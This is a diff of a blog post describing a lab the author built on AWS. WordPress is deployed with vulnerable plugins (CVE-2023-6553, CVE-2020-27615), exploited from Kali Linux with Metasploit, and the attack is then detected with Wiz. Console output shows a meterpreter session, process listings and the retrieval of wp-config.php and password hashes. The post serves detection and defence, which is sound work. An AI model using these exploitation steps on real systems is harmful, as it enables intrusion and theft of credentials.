@@ -24,22 +24,23 @@ tags:
 image: https://user-images.githubusercontent.com/45159366/128566095-253303e2-25d8-42f1-a06d-0b38ca079a1a.png
 ---
 
-In previous posts [1]({%post_url /2024/2024-04-27-exploit-vulnerability-wordpress-plugin-kali-linux-1%})
-and [2]({%post_url /2024/2024-05-09-exploit-vulnerability-wordpress-plugin-kali-linux-2%})
-I've shown how to exploit a vulnerability in a WordPress plugin running on
-Amazon EKS, EC2 and EC2 with Docker instances using [Kali Linux](https://www.kali.org/)
-and [Metasploit](https://www.metasploit.com/).
+In previous posts, [1]({%post_url /2024/2024-04-27-exploit-vulnerability-wordpress-plugin-kali-linux-1%})
+and [2]({%post_url /2024/2024-05-09-exploit-vulnerability-wordpress-plugin-kali-linux-2%}),
+I demonstrated how to exploit a vulnerability in a WordPress plugin running on
+Amazon EKS, EC2, and EC2 with Docker instances using
+[Kali Linux](https://www.kali.org/) and [Metasploit](https://www.metasploit.com/).
 
-In this post, I would like to look at the way to detect the hacker attacks using
-the [Wiz](https://wiz.io/) security tool.
+In this post, I would like to explore how to detect hacker attacks using the
+[Wiz](https://wiz.io/) security tool.
 
-I'm going to cover the following steps:
+I will cover the following steps:
 
-- Install vulnerable Wordpress Application + Plugin to Amazon EKS, EC2
-  and EC2+Docker instances
-- Secure the Amazon EKS and EC2 instances using the security tool
-- Exploit vulnerability in a WordPress plugin using Kali Linux and Metasploit
-- Summarize the results
+- Install a vulnerable WordPress application and plugin to Amazon EKS, EC2, and
+  EC2+Docker instances.
+- Secure the Amazon EKS and EC2 instances using a security tool.
+- Exploit a vulnerability in a WordPress plugin using Kali Linux and
+  Metasploit.
+- Summarize the detection results.
 
 Architecture diagram:
 
@@ -49,9 +50,9 @@ _Kali Linux attacks WordPress on EKS, VM, and VM with Docker_
 ## Build the Amazon EKS, EC2 instances with Wordpress Application and Kali Linux
 
 This section contains the commands needed to build the Amazon EKS and EC2
-instances with the vulnerable Wordpress Application.
-I'm not going to cover all the details, because they were already described in
-previous posts [1]({%post_url /2024/2024-04-27-exploit-vulnerability-wordpress-plugin-kali-linux-1%})
+instances with the vulnerable WordPress application. I will not cover all the
+details, as they were already described in previous posts
+[1]({%post_url /2024/2024-04-27-exploit-vulnerability-wordpress-plugin-kali-linux-1%})
 and [2]({%post_url /2024/2024-05-09-exploit-vulnerability-wordpress-plugin-kali-linux-2%}).
 
 Requirements:
@@ -62,7 +63,7 @@ Requirements:
 - [kubectl](https://github.com/kubernetes/kubectl)
 - [helm](https://github.com/helm/helm)
 
-I will cover only the necessary commands (without descriptions).
+I will cover only the necessary commands here, without detailed descriptions.
 
 ```bash
 # export AWS_ACCESS_KEY_ID="xxxxxxxxxxxxxxxxxx"
@@ -92,8 +93,8 @@ chmod 600 "${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem"
 
 ### Amazon EKS with Wordpress
 
-Install the Amazon EKS cluster using the [eksctl](https://eksctl.io/) running
-vulnerable Wordpress and connect the cluster to Wiz.
+Install the Amazon EKS cluster using [eksctl](https://eksctl.io/), run the
+vulnerable WordPress application, and connect the cluster to Wiz.
 
 ```bash
 export CLUSTER_NAME="Amazon-EKS"
@@ -104,7 +105,7 @@ eksctl create cluster \
   --node-type t3a.medium --node-volume-size 20 --node-private-networking \
   --kubeconfig "${KUBECONFIG}"
 
-## Install vulnerable Wordpress Application to the Amazon EKS cluster using the Helm chart and modify the default values
+## Install vulnerable Wordpress Application to the Amazon EKS cluster using a Helm chart and modify its default values
 WORDPRESS_HELM_CHART_VERSION="22.1.3"
 
 tee "${TMP_DIR}/helm_values-wordpress.yml" << EOF
@@ -158,7 +159,7 @@ EOF
 ### Amazon EC2 with Wordpress container
 
 Create a new [Amazon Linux 2023 EC2 instance](https://github.com/aws-samples/ec2-lamp-server/blob/main/AmazonLinux-2023-LAMP-server.yaml),
-install Docker and run a WordPress container.
+install Docker, and run a WordPress container.
 
 ```bash
 export SOLUTION_EC2_CONTAINER="Amazon-EC2-Container"
@@ -171,14 +172,14 @@ AWS_CLOUDFORMATION_DETAILS=$(aws cloudformation describe-stacks --stack-name "${
 AWS_VPC_ID=$(echo "${AWS_CLOUDFORMATION_DETAILS}" | jq -r ".[] | select(.OutputKey==\"VPC\") .OutputValue")
 AWS_SUBNET_ID=$(echo "${AWS_CLOUDFORMATION_DETAILS}" | jq -r ".[] | select(.OutputKey==\"PublicSubnet1\") .OutputValue")
 
-rain deploy --yes --node-style original "${TMP_DIR}/AmazonLinux-2023-LAMP-server.yaml" "${SOLUTION_EC2_CONTAINER}" \
+rain deploy --node-style original --yes "${TMP_DIR}/AmazonLinux-2023-LAMP-server.yaml" "${SOLUTION_EC2_CONTAINER}" \
   --params "instanceType=t4g.medium,ec2Name=${SOLUTION_EC2_CONTAINER},ec2KeyPair=${AWS_EC2_KEY_PAIR_NAME},vpcID=${AWS_VPC_ID},subnetID=${AWS_SUBNET_ID},ec2TerminationProtection=No,webOption=none,databaseOption=none,phpVersion=none" \
   --tags "Owner=${USER},Environment=dev,Solution=${SOLUTION_EC2_CONTAINER}"
 
 AWS_EC2_CONTAINER_PUBLIC_IP=$(aws ec2 describe-instances --filters "Name=tag:Solution,Values=${SOLUTION_EC2_CONTAINER}" --query "Reservations[].Instances[].PublicIpAddress" --output text)
 ssh -i "${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem" -o StrictHostKeyChecking=no "ec2-user@${AWS_EC2_CONTAINER_PUBLIC_IP}" 'curl -Ls https://github.com/ruzickap.keys >> ~/.ssh/authorized_keys'
 
-## Install Docker and Docker Compose
+## Install Docker and Docker Compose on the instance
 ssh -i "${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem" -o StrictHostKeyChecking=no "ec2-user@${AWS_EC2_CONTAINER_PUBLIC_IP}" << \EOF
 set -euxo pipefail
 sudo dnf install -qy docker
@@ -190,7 +191,7 @@ sudo chown root:root /usr/local/lib/docker/cli-plugins/docker-compose
 sudo chmod +x /usr/local/lib/docker/cli-plugins/docker-compose
 EOF
 
-## Install Wordpress in the container with vulnerable WordPress Backup Migration Plugin and Loginizer plugins
+## Install Wordpress in a container with the vulnerable WordPress Backup Migration Plugin and Loginizer plugins
 # shellcheck disable=SC2087
 ssh -i "${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem" -o StrictHostKeyChecking=no "ec2-user@${AWS_EC2_CONTAINER_PUBLIC_IP}" << EOF2
 set -euxo pipefail
@@ -254,7 +255,7 @@ EOF2
 ### Amazon EC2 with Wordpress
 
 Launch a new [Amazon Linux 2023 EC2 instance](https://github.com/aws-samples/ec2-lamp-server/blob/main/AmazonLinux-2023-LAMP-server.yaml)
-with WordPress.
+for a standalone WordPress installation.
 
 ```bash
 export SOLUTION_EC2="Amazon-EC2"
@@ -274,7 +275,7 @@ rain deploy --node-style original --yes "${TMP_DIR}/AmazonLinux-2023-LAMP-server
 AWS_EC2_PUBLIC_IP=$(aws ec2 describe-instances --filters "Name=tag:Solution,Values=${SOLUTION_EC2}" --query "Reservations[].Instances[].PublicIpAddress" --output text)
 ssh -i "${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem" -o StrictHostKeyChecking=no "ec2-user@${AWS_EC2_PUBLIC_IP}" 'curl -Ls https://github.com/ruzickap.keys >> ~/.ssh/authorized_keys'
 
-## Configure MariaDB and add "wordpress" user with password
+## Configure MariaDB and add a "wordpress" user with a password
 # shellcheck disable=SC2087
 ssh -i "${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem" -o StrictHostKeyChecking=no "ec2-user@${AWS_EC2_PUBLIC_IP}" << EOF2
 set -euxo pipefail
@@ -289,7 +290,7 @@ GRANT ALL PRIVILEGES ON ${MARIADB_WORDPRESS_DATABASE}.* TO '${MARIADB_WORDPRESS_
 FLUSH PRIVILEGES;
 EOF
 
-## Install Wordpress with vulnerable WordPress Backup Migration Plugin and Loginizer plugins
+## Install Wordpress with the vulnerable WordPress Backup Migration Plugin and Loginizer plugins
 # shellcheck disable=SC2087
 wget -q https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar
 chmod +x wp-cli.phar
@@ -313,7 +314,7 @@ EOF2
 
 ### AWS EC2 instance with Kali Linux
 
-Launch an AWS EC2 instance with [Kali Linux](https://www.kali.org/) using the
+Launch an AWS EC2 instance with [Kali Linux](https://www.kali.org/) using a
 [CloudFormation template](https://github.com/aws-samples/amazon-ec2-nice-dcv-samples/blob/main/cfn/KaliLinux-NICE-DCV.yaml).
 
 ```bash
@@ -334,16 +335,32 @@ rain deploy --yes --node-style original "${TMP_DIR}/KaliLinux-NICE-DCV.yaml" "${
 
 ## Attack the Wordpress Application from Kali Linux
 
-The following part describes the usage of [Metasploit Framework](https://www.metasploit.com/)
-to exploit the vulnerability in the [WordPress Backup Migration Plugin](https://wordpress.org/plugins/backup-backup/)
+The following section describes using the
+[Metasploit Framework](https://www.metasploit.com/) to exploit vulnerabilities
+in the [WordPress Backup Migration Plugin](https://wordpress.org/plugins/backup-backup/)
 and [Loginizer](https://wordpress.org/plugins/loginizer/) plugins.
 
-Allow my user to connect to Kali Linux instance using SSH and install Metasploit:
+Details about the WordPress plugin vulnerabilities can be found here:
+
+- [WordPress Backup Migration Plugin](https://wordpress.org/plugins/backup-backup/)
+  - [WordPress Backup Migration Plugin PHP Filter Chain RCE](https://www.rapid7.com/db/modules/exploit/multi/http/wp_backup_migration_php_filter/)
+  - [Vulnerability Details : CVE-2023-6553](https://www.cvedetails.com/cve/CVE-2023-6553/)
+  - [CVE-2023-6553 Exploit V2](https://github.com/Chocapikk/CVE-2023-6553)
+  - [CVE-2023-6553 Detail](https://nvd.nist.gov/vuln/detail/CVE-2023-6553)
+  - [Unauth RCE in the WordPress plugin: Backup Migration (<= 1.3.7)](https://github.com/rapid7/metasploit-framework/blob/6d8666e35b96b3c16e63acb57381b5efdcafb0d0/documentation/modules/exploit/multi/http/wp_backup_migration_php_filter.md)
+- [Loginizer](https://wordpress.org/plugins/loginizer/)
+  - [WordPress Loginizer log SQLi Scanner](https://www.rapid7.com/db/modules/auxiliary/scanner/http/wp_loginizer_log_sqli/)
+  - [Vulnerability Details : CVE-2020-27615](https://www.cvedetails.com/cve/CVE-2020-27615/)
+  - [CVE-2020-27615 Detail](https://nvd.nist.gov/vuln/detail/CVE-2020-27615)
+  - [Loginizer timebased SQL injection in versions before 1.6.4](https://github.com/rapid7/metasploit-framework/blob/980230e5f1b8b34656f75eda1d5fde47cfd9866c/documentation/modules/auxiliary/scanner/http/wp_loginizer_log_sqli.md)
+
+Allow your user to connect to the Kali Linux instance using SSH and then
+install Metasploit:
 
 ```bash
 AWS_EC2_KALI_LINUX_PUBLIC_IP=$(aws ec2 describe-instances --filters "Name=tag:Solution,Values=${SOLUTION_KALI}" --query "Reservations[].Instances[].PublicIpAddress" --output text)
 ssh -i "${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem" -o StrictHostKeyChecking=no "kali@${AWS_EC2_KALI_LINUX_PUBLIC_IP}" 'curl -Ls https://github.com/ruzickap.keys >> ~/.ssh/authorized_keys'
-scp -i "${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem" -o StrictHostKeyChecking=no "${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem" "kali@${AWS_EC2_KALI_LINUX_PUBLIC_IP}:~"
+scp -i "${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem" -o StrictHostKeyChecking=no "${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem" "kali@${AWS_EC2_KALI_LINUX_PUBLIC_IP}":~
 ssh -i "${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem" -o StrictHostKeyChecking=no "kali@${AWS_EC2_KALI_LINUX_PUBLIC_IP}" << EOF
 touch ~/.hushlogin
 sudo snap install metasploit-framework
@@ -351,8 +368,11 @@ msfdb init
 EOF
 ```
 
-Run Metasploit Framework and exploit the vulnerability in all three environments
-(EKS, standalone EC2 instance and EC2 with Docker):
+![Metasploit](https://user-images.githubusercontent.com/63872951/187396388-1c15dd6e-95a0-438a-ada5-71e49ff17f4e.jpg){:width="500"}
+_Metasploit logo_
+
+Run the Metasploit Framework and exploit the vulnerability in all three
+environments (EKS, a standalone EC2 instance, and EC2 with Docker):
 
 ```bash
 # shellcheck disable=SC2087
@@ -377,7 +397,7 @@ EOF2
 done
 ```
 
-The output was condensed to display only the attack on WordPress running in
+The output below was condensed to display only the attack against WordPress on
 Amazon EKS:
 
 ```console
@@ -419,21 +439,21 @@ resource (stdin)> sessions --interact 1 --meterpreter-command ps --meterpreter-c
 Process List
 ============
 
- PID  Name                           User  Path
- ---  ----                           ----  ----
- 1    /opt/bitnami/apache/bin/httpd  1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
- 309  /opt/bitnami/apache/bin/httpd  1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
- 310  /opt/bitnami/apache/bin/httpd  1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
- 311  /opt/bitnami/apache/bin/httpd  1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
- 312  /opt/bitnami/apache/bin/httpd  1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
- 313  /opt/bitnami/apache/bin/httpd  1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
- 314  /opt/bitnami/apache/bin/httpd  1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
- 316  /opt/bitnami/apache/bin/httpd  1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
- 317  /opt/bitnami/apache/bin/httpd  1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
- 318  /opt/bitnami/apache/bin/httpd  1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
- 319  /opt/bitnami/apache/bin/httpd  1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
- 320  sh                             1001  sh -c ps ax -w -o pid,user,cmd --no-header 2>/dev/null
- 321  ps                             1001  ps ax -w -o pid,user,cmd --no-header
+ PID  Name                                              User  Path
+ ---  ----                                              ----  ----
+ 1    /opt/bitnami/apache/bin/httpd                     1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
+ 309  /opt/bitnami/apache/bin/httpd                     1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
+ 310  /opt/bitnami/apache/bin/httpd                     1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
+ 311  /opt/bitnami/apache/bin/httpd                     1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
+ 312  /opt/bitnami/apache/bin/httpd                     1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
+ 313  /opt/bitnami/apache/bin/httpd                     1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
+ 314  /opt/bitnami/apache/bin/httpd                     1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
+ 316  /opt/bitnami/apache/bin/httpd                     1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
+ 317  /opt/bitnami/apache/bin/httpd                     1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
+ 318  /opt/bitnami/apache/bin/httpd                     1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
+ 319  /opt/bitnami/apache/bin/httpd                     1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
+ 320  sh                                                1001  sh -c ps ax -w -o pid,user,cmd --no-header 2>/dev/null
+ 321  ps                                                1001  ps ax -w -o pid,user,cmd --no-header
 
 [*] Running 'sysinfo' on meterpreter session 1 (3.120.120.128)
 Computer    : wordpress-5db67cf9bf-z45tq
@@ -464,20 +484,20 @@ resource (stdin)> run
 ...
 ```
 
-The outputs above indicate that the attack on the WordPress site was successful.
-We retrieved information about the remote system, including a list of processes,
-the `wp-config.php` file, system details, and a list of users along with
-password hashes.
+The outputs above indicate that the attack against the WordPress site was
+successful. We retrieved information about the remote system, including a list
+of processes, the `wp-config.php` file, system details, and a list of users
+with their password hashes.
 
 ## Details in Security tool
 
-Explore the [Wiz](https://wiz.io/) security tool and learn how it can assist
-in identifying hacker attacks.
+Explore the [Wiz](https://wiz.io/) security tool to learn how it can assist in
+identifying hacker attacks.
 
 ### Wiz Sensor details
 
 Let's look at the [Wiz Sensor](https://www.wiz.io/lp/wiz-runtime-sensor) details
-in Wiz to be sure everything was properly installed.
+in Wiz to ensure everything was properly installed.
 
 ![Wiz Sensor - Amazon EKS](/assets/img/posts/2024/2024-07-07-detect-a-hacker-attacks-eks-vm/wiz-deployments-sensor-amazon-eks.avif)
 _Wiz -> Settings -> Deployment -> Sensor - Amazon EKS_
@@ -487,7 +507,7 @@ _Wiz -> Settings -> Deployment -> Sensor - EC2_
 
 ### Examine the details about the breach
 
-First place where to look in Wiz is the "Issues" tab:
+The first place to look in Wiz is the "Issues" tab:
 
 ![Wiz Issues](/assets/img/posts/2024/2024-07-07-detect-a-hacker-attacks-eks-vm/wiz-issues.avif)
 _Wiz -> Issues_
@@ -501,13 +521,13 @@ _Wiz -> Issues -> Amazon EC2 + Docker details_
 ![Wiz Issues EC2 Details](/assets/img/posts/2024/2024-07-07-detect-a-hacker-attacks-eks-vm/wiz-issues-ec2-details.avif)
 _Wiz -> Issues -> Amazon EC2 details_
 
-... or Cloud Events:
+...or check Cloud Events:
 
 ![Wiz Cloud Events](/assets/img/posts/2024/2024-07-07-detect-a-hacker-attacks-eks-vm/wiz-cloud-events.avif)
 _Wiz -> Cloud Events_
 
-If you view the details of the Amazon EKS cluster or the EC2 instances, you can
-also access information about the attack:
+If you view the details of the Amazon EKS cluster or the EC2 instances in Wiz,
+you can also access information about the attack:
 
 ![Wiz Amazon EKS issues](/assets/img/posts/2024/2024-07-07-detect-a-hacker-attacks-eks-vm/wiz-amazon-eks-issues.avif)
 _Wiz -> Amazon EKS issues_
@@ -522,7 +542,7 @@ _Wiz -> Amazon EKS_
 _Wiz -> Amazon EKS -> Issues -> Details -> Investigation_
 
 Additional breach details can be found in the "Runtime Response Policies"
-section:
+section.
 
 ![Wiz Runtime Response Policies](/assets/img/posts/2024/2024-07-07-detect-a-hacker-attacks-eks-vm/wiz-response-policy.avif)
 _Wiz -> Policies -> Runtime Response Policies -> Details_
@@ -536,15 +556,16 @@ vulnerabilities:
 ![Wiz Container image details](/assets/img/posts/2024/2024-07-07-detect-a-hacker-attacks-eks-vm/wiz-wordpress-container.avif)
 _Wiz -> Container Image details_
 
-The screenshots above illustrate the Detection capabilities of [Wiz](https://www.wiz.io/)
-combined with [Wiz Sensor](https://www.wiz.io/lp/wiz-runtime-sensor), enabling
-Security teams to identify system breaches. It's essential to configure
-notifications and responses to ensure timely alerts in the event of an attack...
+The screenshots above illustrate the detection capabilities of
+[Wiz](https://www.wiz.io/) combined with the
+[Wiz Sensor](https://www.wiz.io/lp/wiz-runtime-sensor), enabling security teams
+to identify system breaches. It's essential to configure notifications and
+responses to ensure timely alerts in the event of an attack.
 
 ## Cleanup
 
-Delete the Amazon EKS cluster, the Kali Linux EC2 instance, and
-the EC2 Key Pair:
+Delete the Amazon EKS cluster, Kali Linux EC2 instance, EC2 Key Pair, and
+related CloudFormation stacks:
 
 ```sh
 export AWS_REGION="eu-central-1"
@@ -576,3 +597,5 @@ done
 ```
 
 Enjoy ... 😉
+
+[end of _posts/2024/2024-07-07-detect-a-hacker-attacks-eks-vm.md]
